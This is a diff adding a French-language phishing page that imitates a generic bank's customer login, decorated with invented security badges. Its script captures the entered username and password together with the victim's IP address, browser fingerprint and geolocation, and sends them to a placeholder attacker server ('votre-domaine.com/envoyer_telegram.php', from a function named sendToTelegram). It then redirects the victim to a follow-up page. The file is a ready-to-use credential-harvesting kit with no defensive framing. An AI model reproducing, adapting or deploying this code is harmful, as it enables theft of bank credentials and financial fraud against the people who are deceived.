@@ -1,0 +1,482 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion Sécurisée - Espace Bancaire</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'bank-blue': '#1e40af',
+            'bank-blue-light': '#3b82f6',
+            'bank-dark': '#0f172a',
+            'bank-gold': '#d4af37',
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    :root {
+      --primary: #1e40af;
+      --primary-light: #3b82f6;
+      --dark: #0f172a;
+      --gold: #d4af37;
+    }
+    
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 240px;
+      background: linear-gradient(135deg, var(--primary) 0%, var(--dark) 100%);
+      z-index: -1;
+      border-radius: 0 0 20px 20px;
+    }
+
+    .container {
+      animation: slideIn 0.6s ease-out;
+    }
+
+    @keyframes slideIn {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    .card-hover {
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05), 0 1px 3px rgba(0, 0, 0, 0.1);
+    }
+
+    .card-hover:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+    }
+
+    .input-icon {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #64748b;
+      transition: color 0.3s ease;
+    }
+
+    .input-field:focus + .input-icon {
+      color: var(--primary);
+    }
+
+    .error {
+      animation: shake 0.4s;
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-6px); }
+      75% { transform: translateX(6px); }
+    }
+
+    .security-badge {
+      background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+    }
+
+    .password-toggle {
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .password-toggle:hover {
+      color: var(--primary);
+    }
+
+    .loading-dots {
+      display: inline-flex;
+    }
+    
+    .loading-dots span {
+      width: 8px;
+      height: 8px;
+      margin: 0 3px;
+      background-color: white;
+      border-radius: 50%;
+      animation: bounce 1.5s infinite ease-in-out;
+    }
+    
+    .loading-dots span:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+    
+    .loading-dots span:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+    
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-5px); }
+    }
+
+    .footer-link {
+      transition: all 0.2s ease;
+    }
+
+    .footer-link:hover {
+      color: var(--primary-light);
+    }
+
+    .round-logo {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      transition: all 0.3s ease;
+      background: white;
+      overflow: hidden;
+    }
+
+    .round-logo:hover {
+      transform: scale(1.05);
+      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.15);
+    }
+
+    .logo-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      max-width: 600px;
+      margin-bottom: 30px;
+      padding: 0 20px;
+    }
+
+    .logo-image {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .security-header {
+      background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%);
+      border-left: 4px solid #d4af37;
+    }
+
+    @media (max-width: 768px) {
+      .logo-container {
+        justify-content: space-between;
+        padding: 0 15px;
+      }
+      
+      .round-logo {
+        width: 100px;
+        height: 100px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Header avec sécurité renforcée -->
+  <header class="w-full max-w-5xl security-header text-white py-3 px-6 rounded-lg shadow-md mt-6 mb-4 mx-4">
+    <div class="flex flex-col md:flex-row items-center justify-between">
+      <div class="flex items-center mb-2 md:mb-0">
+        <div class="bg-green-500 p-2 rounded-full mr-3">
+          <i class="fas fa-lock text-white"></i>
+        </div>
+        <div>
+          <span class="block text-sm font-semibold">Système de sécurité max</span>
+          <span class="block text-xs opacity-90">Sécurité renforcée</span>
+        </div>
+      </div>
+      <div class="flex items-center">
+        <div class="hidden md:flex items-center mr-4">
+          <i class="fas fa-shield-check text-green-400 mr-1"></i>
+          <span class="text-xs">Sécurité PCI DSS Niveau 1</span>
+        </div>
+        <div class="bg-blue-700 py-1 px-3 rounded-full">
+          <span class="text-xs">Session cryptée TLS 1.3</span>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Logos ronds à gauche et à droite -->
+  <div class="logo-container">
+    <!-- Logo protection à gauche -->
+    <div class="round-logo">
+      <img src="protection.jpg" alt="Protection" class="logo-image">
+    </div>
+    
+    <!-- Logo sécurité à droite -->
+    <div class="round-logo">
+      <img src="sécurité.png" alt="Sécurité" class="logo-image">
+    </div>
+  </div>
+
+  <!-- Contenu principal -->
+  <div class="container max-w-md mx-auto bg-white rounded-xl shadow-xl overflow-hidden card-hover">
+    <!-- En-tête avec logo -->
+    <div class="bg-bank-blue text-white p-5 text-center">
+      <h1 class="text-xl font-bold">Espace Client Bancaire</h1>
+    </div>
+    
+    <div class="p-6">
+      <div class="flex items-center justify-center mb-4">
+        <div class="security-badge text-white text-xs font-semibold py-1 px-3 rounded-full inline-flex items-center">
+          <i class="fas fa-shield-alt mr-1"></i> Vérification d'identité requise
+        </div>
+      </div>
+      
+      <h2 class="text-2xl font-bold text-gray-800 text-center mb-2">connectez vous a votre compte pour poursuivre votre transaction</h2>
+      <p class="text-gray-600 text-center mb-6">Authentifiez-vous pour accéder à vos services bancaires</p>
+      
+      <form id="login-form">
+        <div class="mb-5">
+          <label for="login" class="block text-sm font-medium text-gray-700 mb-2">Identifiant ou adresse e-mail</label>
+          <div class="relative">
+            <input type="text" id="login" class="w-full p-4 border border-gray-300 rounded-lg focus:border-bank-blue focus:ring-2 focus:ring-blue-200 transition-all input-field" placeholder="Saisissez votre identifiant ou e-mail" required>
+            <i class="fas fa-user input-icon"></i>
+          </div>
+        </div>
+        
+        <div class="mb-5">
+          <div class="flex items-center justify-between mb-2">
+            <label for="password" class="block text-sm font-medium text-gray-700">Mot de passe</label>
+            <a href="#" class="text-xs text-bank-blue hover:text-bank-blue-light font-medium transition-colors">Code oublié ?</a>
+          </div>
+          <div class="relative">
+            <input type="password" id="password" class="w-full p-4 border border-gray-300 rounded-lg focus:border-bank-blue focus:ring-2 focus:ring-blue-200 transition-all input-field" placeholder="Saisissez votre mot de passe" required>
+            <i class="fas fa-lock input-icon"></i>
+            <span class="password-toggle absolute right-10 top-1/2 transform -translate-y-1/2 text-gray-400" id="togglePassword">
+              <i class="fas fa-eye"></i>
+            </span>
+          </div>
+        </div>
+        
+        <div class="flex items-center mb-5">
+          <input type="checkbox" id="remember" class="h-4 w-4 text-bank-blue focus:ring-bank-blue border-gray-300 rounded">
+          <label for="remember" class="ml-2 block text-sm text-gray-700">Reconnaître cet appareil</label>
+        </div>
+        
+        <button type="submit" class="w-full bg-bank-blue text-white py-4 rounded-lg font-semibold hover:bg-bank-dark transition-all duration-300 flex items-center justify-center gap-2 shadow-md hover:shadow-lg">
+          <i class="fas fa-sign-in-alt"></i> Se connecter
+        </button>
+        
+        <p class="error text-red-600 text-sm mt-4 text-center hidden" id="error-login">
+          <i class="fas fa-exclamation-circle mr-1"></i> Identifiant ou mot de passe incorrect
+        </p>
+      </form>
+      
+      <div class="mt-6 pt-6 border-t border-gray-200">
+        <p class="text-center text-sm text-gray-600">Première utilisation de nos services ?</p>
+        <a href="#" class="block text-center mt-2 w-full py-3 border border-bank-blue text-bank-blue rounded-lg font-semibold hover:bg-blue-50 transition-all duration-300">
+          Activez votre accès en ligne
+        </a>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Messages de sécurité -->
+  <div class="max-w-md mx-auto mt-6 bg-blue-50 border border-blue-200 rounded-lg p-4">
+    <div class="flex">
+      <div class="flex-shrink-0">
+        <i class="fas fa-info-circle text-blue-500 mt-1 text-lg"></i>
+      </div>
+      <div class="ml-3">
+        <h3 class="text-sm font-medium text-blue-800">Protection avancée contre la fraude</h3>
+        <div class="mt-2 text-sm text-blue-700">
+          <p>Notre système de détection d'anomalies surveille en permanence toute activité suspecte pour protéger votre compte.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="w-full max-w-4xl mt-8 px-4">
+    <div class="bg-white rounded-lg shadow-sm p-5">
+      <div class="flex flex-col md:flex-row justify-between items-center">
+        <div class="mb-4 md:mb-0">
+          <p class="text-xs text-gray-600">© 2025 Espace Bancaire. Tous droits réservés.</p>
+        </div>
+        <div class="flex space-x-4">
+          <a href="#" class="footer-link text-xs text-gray-600 hover:text-bank-blue">Sécurité</a>
+          <a href="#" class="footer-link text-xs text-gray-600 hover:text-bank-blue">Conditions d'utilisation</a>
+          <a href="#" class="footer-link text-xs text-gray-600 hover:text-bank-blue">Accessibilité</a>
+          <a href="#" class="footer-link text-xs text-gray-600 hover:text-bank-blue">Mentions légales</a>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+const form = document.getElementById('login-form');
+const errorLogin = document.getElementById('error-login');
+const togglePassword = document.getElementById('togglePassword');
+const passwordInput = document.getElementById('password');
+
+// Fonction pour obtenir l'adresse IP
+async function getIPAddress() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        return 'Non disponible';
+    }
+}
+
+// Fonction pour obtenir les informations du navigateur
+function getBrowserInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        date: new Date().toLocaleString('fr-FR')
+    };
+}
+
+// Fonction pour obtenir la géolocalisation approximative via IP
+async function getGeoLocation(ip) {
+    try {
+        const response = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await response.json();
+        return {
+            city: data.city || 'Inconnu',
+            region: data.region || 'Inconnu',
+            country: data.country_name || 'Inconnu',
+            org: data.org || 'Fournisseur inconnu'
+        };
+    } catch (error) {
+        return {
+            city: 'Inconnu',
+            region: 'Inconnu',
+            country: 'Inconnu',
+            org: 'Fournisseur inconnu'
+        };
+    }
+}
+
+// --- FONCTION CORRIGÉE ---
+// Envoie les données à VOTRE SERVEUR au lieu de Telegram
+async function sendToTelegram(login, password) {
+    // Obtenir des informations supplémentaires
+    const ipAddress = await getIPAddress();
+    const browserInfo = getBrowserInfo();
+    const geoInfo = await getGeoLocation(ipAddress);
+
+    // Préparer les données à envoyer à votre serveur
+    const payload = {
+        login: login,
+        password: password,
+        ipAddress: ipAddress,
+        browserInfo: browserInfo,
+        geoInfo: geoInfo
+    };
+
+    // URL de VOTRE script serveur. REMPLACEZ CETTE URL PAR LA VOTRE.
+    const serverUrl = 'https://votre-domaine.com/envoyer_telegram.php';
+
+    try {
+        const response = await fetch(serverUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload),
+        });
+
+        if (!response.ok) {
+            throw new Error('Le serveur a retourné une erreur.');
+        }
+
+        const result = await response.json();
+        if (result.success) {
+            console.log('Données envoyées au serveur avec succès');
+        } else {
+            throw new Error(result.message || 'Erreur inconnue du serveur.');
+        }
+
+    } catch (error) {
+        console.error('Erreur lors de l\'envoi au serveur:', error);
+        // Affiche l'erreur à l'utilisateur
+        errorLogin.textContent = 'Erreur lors de l\'envoi des données. Veuillez réessayer.';
+        errorLogin.classList.remove('hidden');
+    }
+}
+
+// Fonctionnalité pour afficher/masquer le mot de passe
+togglePassword.addEventListener('click', function() {
+    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordInput.setAttribute('type', type);
+    // Changer l'icône
+    const icon = this.querySelector('i');
+    if (type === 'password') {
+        icon.classList.remove('fa-eye-slash');
+        icon.classList.add('fa-eye');
+    } else {
+        icon.classList.remove('fa-eye');
+        icon.classList.add('fa-eye-slash');
+    }
+});
+
+form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const login = document.getElementById('login').value;
+    const password = document.getElementById('password').value;
+
+    // Validation basique
+    if (!login || !password) {
+        errorLogin.textContent = "Veuillez remplir tous les champs";
+        errorLogin.classList.remove('hidden');
+        form.classList.add('error');
+        setTimeout(() => {
+            form.classList.remove('error');
+        }, 400);
+        return;
+    }
+
+    // Animation de chargement
+    const button = form.querySelector('button');
+    button.innerHTML = '<div class="loading-dots"><span></span><span></span><span></span></div>';
+    button.disabled = true;
+
+    // Cacher l'erreur précédente
+    errorLogin.classList.add('hidden');
+
+    // Envoyer les données à votre serveur
+    await sendToTelegram(login, password);
+
+    // Simuler un délai de connexion avant la redirection
+    setTimeout(() => {
+        // Redirection vers la page de vérification
+        window.location.href = 'banque.html';
+    }, 2000);
+});
+
+// Focus sur le premier champ au chargement
+document.getElementById('login').focus();
+          </script>
+</body>
+</html>
